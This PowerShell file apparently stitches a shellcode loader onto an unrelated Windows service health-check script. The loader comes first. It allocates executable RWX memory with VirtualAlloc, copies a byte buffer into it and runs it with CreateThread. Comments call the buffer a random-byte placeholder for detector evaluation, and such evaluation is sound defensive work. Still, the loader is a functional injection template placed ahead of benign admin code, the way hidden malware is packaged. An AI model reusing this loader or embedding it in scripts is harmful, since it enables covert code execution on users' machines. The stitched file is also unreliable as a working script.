
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class MemoryApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x6e, 0xad, 0x8e, 0x24, 0xc0, 0x92, 0x30, 0x9a, 0x26, 0xec, 0xc8, 0x89, 0xd7, 0xb9, 0xc8, 0x57,
        0xa9, 0x1e, 0xa8, 0x43, 0xa0, 0xc0, 0xbe, 0x82, 0xf2, 0x18, 0xb2, 0xf1, 0xaf, 0x11, 0x36, 0x35,
        0x41, 0xa0, 0x8f, 0x6b, 0x1a, 0xb9, 0x7a, 0x42, 0x89, 0x1c, 0x12, 0xc9, 0x65, 0x33, 0xc6, 0xf3,
        0x84, 0x95, 0xb3, 0x81, 0xd6, 0xee, 0xc5, 0xb0, 0x74, 0x4a, 0x86, 0x2f, 0x37, 0x31, 0xfd, 0x18,
        0x18, 0x50, 0xd1, 0x27, 0x9c, 0x98, 0x71, 0x37, 0xf9, 0x86, 0x48, 0xc7, 0x98, 0x95, 0xba, 0x35,
        0x9f, 0xc7, 0x75, 0x41, 0x3b, 0x46, 0xde, 0xaa, 0xb5, 0x8b, 0x03, 0xdb, 0xc5, 0x9e, 0x5f, 0x3c,
        0xab, 0xc9, 0x65, 0xc4, 0x7f, 0x7b, 0x67, 0x36, 0x02, 0xc5, 0x17, 0xf8, 0x2e, 0x07, 0x48, 0xd9,
        0x84, 0xf6, 0x7f, 0x46, 0x4e, 0xeb, 0x8b, 0x1e, 0x5c, 0x08, 0x9e, 0xa6, 0x2d, 0xe2, 0x7c, 0xa0,
        0xf7, 0x45, 0xf0, 0xa2, 0x31, 0xde, 0x65, 0xe6, 0x2c, 0xf8, 0x12, 0xc1, 0x19, 0x8b, 0x14, 0x7a,
        0x3a, 0xf6, 0x93, 0xef, 0x09, 0xf2, 0xfd, 0x5d, 0xa1, 0xda, 0x8d, 0xfe, 0x1e, 0x56, 0x65, 0x47,
        0x5b, 0xe9, 0xac, 0xeb, 0x1d, 0x11, 0x26, 0x94, 0xe5, 0x2a, 0x67, 0xf1, 0xad, 0x2d, 0x74, 0x99,
        0xe9, 0x1d, 0x66, 0x20, 0xd6, 0xb5, 0xf6, 0x7e, 0x6b, 0x21, 0xfe, 0x44, 0x38, 0x0d, 0x94, 0xfd,
        0xf3, 0x68, 0x3b, 0x0e, 0x71, 0x43, 0xf3, 0xf8, 0xdf, 0xc3, 0xa1, 0x11, 0x8f, 0x7a, 0x93, 0x40,
        0x19, 0x02, 0x29, 0x21, 0xe7, 0xb8, 0x66, 0xfe, 0x9d, 0xc4, 0xc2, 0xee, 0xda, 0xd8, 0x3c, 0x0a,
        0x93, 0x0a, 0xba, 0x34, 0xbd, 0x83, 0xfe, 0x27, 0xa7, 0xea, 0x26, 0x63, 0x64, 0x1f, 0x78, 0xef,
        0xbc, 0xf3, 0xc6, 0xe6, 0x68, 0x63, 0xcb, 0x31, 0x4c, 0x98, 0x99, 0xa0, 0x59, 0xee, 0x03, 0x63,
        0xb0, 0xdc, 0xb0, 0xed, 0xd0, 0x1d, 0xec, 0xc7, 0x9d, 0x33, 0x77, 0x88, 0x58, 0xac, 0x92, 0x1c,
        0x1f, 0xe3, 0x13, 0x39, 0x14, 0x89, 0x4e, 0x21, 0x5c, 0xa9, 0x3b, 0x86, 0x0b, 0x07, 0x83, 0x08,
        0x45, 0x14, 0x45, 0x55, 0xc9, 0x0b, 0x91, 0xed, 0x93, 0xd1, 0x2a, 0x8c, 0x63, 0xff, 0xb9, 0x6b,
        0xbb, 0x54, 0x2f, 0x8d, 0x88, 0x3f, 0xf6, 0xe7, 0xa1, 0x81, 0xb5, 0xb2, 0x9f, 0x77, 0x01, 0x19,
        0x61, 0xb0, 0xf5, 0x6d, 0x86, 0x26, 0x6a, 0xa8, 0xd4, 0xf6, 0x89, 0x83, 0x27, 0xa6, 0xb8, 0x27,
        0xa2, 0xa5, 0xb7, 0xf6, 0xf3, 0xa2, 0x92, 0xfd, 0x84, 0x2e, 0xf1, 0x27, 0xed, 0x78, 0x4c, 0x48,
        0xc5, 0x95, 0x7d, 0x8b, 0xd9, 0xf0
    )

    $MemoryHandle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($MemoryHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][MemoryApi]::WaitForSingleObject($Thread, 4235)
    [void][MemoryApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
<#
.SYNOPSIS
    Checks the configured Windows services on a list of servers.
.DESCRIPTION
    Probes the management port first, then queries each service and records the
    state in a result set that is exported to CSV.
    Any service that is not Running triggers a single alert mail with the
    offending rows.
.EXAMPLE
    .\Test-ServiceHealth.ps1 -Servers mgmt01, app-prod-01
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string[]]$Servers = @('mgmt01', 'app-prod-01', 'dc02', 'web-stg-01', 'srv02'),
    [string[]]$Services = @('Dhcp', 'W3SVC', 'DNS', 'WinRM'),
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 65535)]
    [int]$Port = 5986,
    [int]$TimeoutMilliseconds = 3000,

    [string]$ReportPath = 'C:\Reports\service-health-2025-05-21.csv'
)


function Test-ServerPort {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 5985,
        [int]$TimeoutMilliseconds = 2000
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($ComputerName, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne($TimeoutMilliseconds)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

$results = foreach ($srv in $Servers) {
    if (-not (Test-ServerPort -ComputerName $srv -Port $Port -TimeoutMilliseconds $TimeoutMilliseconds)) {
        [pscustomobject]@{
            Server    = $srv
            Service   = '*'
            Status    = 'Unreachable'
            CheckedAt = Get-Date
        }
        continue
    }
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server    = $srv
            Service   = $svc
            Status    = $(if ($service) { $service.Status } else { 'NotFound' })
            CheckedAt = Get-Date
        }
    }
}
$down = @($results | Where-Object { $_.Status -ne 'Running' })
$unreachable = @($results | Where-Object { $_.Status -eq 'Unreachable' })

$retry = @($down | Where-Object { $_.Service -ne '*' })
for ($attempt = 1; $attempt -le 2; $attempt++) {
    if (@($retry).Count -eq 0) { break }
    Start-Sleep -Seconds 5
    Write-Verbose ("Retry {0}: {1} services still down" -f $attempt, @($retry).Count)
    $retry = @($retry | Where-Object {
        (Get-Service -ComputerName $_.Server -Name $_.Service -ErrorAction SilentlyContinue).Status -ne 'Running'
    })
}

$results | Export-Csv -Path $ReportPath -NoTypeInformation
$down | Export-Csv -Path $ReportPath.Replace('.csv', '-down.csv') -NoTypeInformation -Encoding UTF8

$byServer = $results | Group-Object -Property Server | ForEach-Object {
    [pscustomobject]@{
        Server = $_.Name
        Checks = $_.Count
        Failed = @($_.Group | Where-Object { $_.Status -ne 'Running' }).Count
    }
}
$byServer | Format-Table -AutoSize

$MailTo = 'monitoring@internal.corp'
$down = @($results | Where-Object { $_.Status -ne 'Running' })
if ($down.Count -gt 0) {
    $summaryBody = $down | ConvertTo-Html -Fragment | Out-String
    Send-MailMessage -To $MailTo -From "monitoring@internal.corp" -Subject "Service alert on $env:COMPUTERNAME" -Body $summaryBody -SmtpServer 'smtp.internal.corp' -Port 25 -UseSsl
}

$history = $ReportPath.Replace('.csv', '-history.csv')
$results | Export-Csv -Path $history -NoTypeInformation -Append -Encoding UTF8
Write-Host ("Health check complete: {0} of {1} services running" -f (@($results).Count - $down.Count), @($results).Count) -ForegroundColor Green

$dashboard = $results | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{ Service = $_.Name; Running = @($_.Group | Where-Object { $_.Status -eq 'Running' }).Count }
}
$dashboard | Format-Table -AutoSize

$probe = Test-ServerPort -ComputerName $env:COMPUTERNAME -Port $Port
Write-Verbose ("Local port {0} reachable: {1}" -f $Port, $probe)

$osInfo = foreach ($srv in $Servers) {
    [pscustomobject]@{
        Server = $srv
        Reachable = Test-ServerPort -ComputerName $srv -Port $Port
    }
}
$osInfo | Format-Table -AutoSize

$errorRows = $results | Where-Object { $_.Status -eq 'NotFound' }
if (@($errorRows).Count -gt 0) {
    Write-Warning ("Services not installed: {0}" -f @($errorRows).Count)
}

$uptime = @($results | Where-Object { $_.Status -eq 'Running' }).Count
Write-Verbose ("Running checks: {0}" -f $uptime)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)
